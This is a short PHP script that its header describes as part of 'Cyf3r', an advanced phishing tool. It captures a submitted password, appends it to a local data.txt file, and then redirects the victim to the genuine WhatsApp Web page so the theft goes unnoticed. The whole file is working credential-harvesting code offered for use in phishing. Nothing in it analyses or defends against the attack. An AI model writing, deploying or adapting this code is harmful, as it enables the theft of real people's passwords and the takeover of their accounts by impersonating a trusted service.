<?php 

/*
*  Copyright (c) 2022 Hirech Baghdad Belkheir <hirechbaghdad@outlook.com>.
*  Cyf3r is a advanced phishing tool.
*/


// Set File write informations
$file = "data.txt";

file_put_contents($file, "Password: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://web.whatsapp.com/"/>  
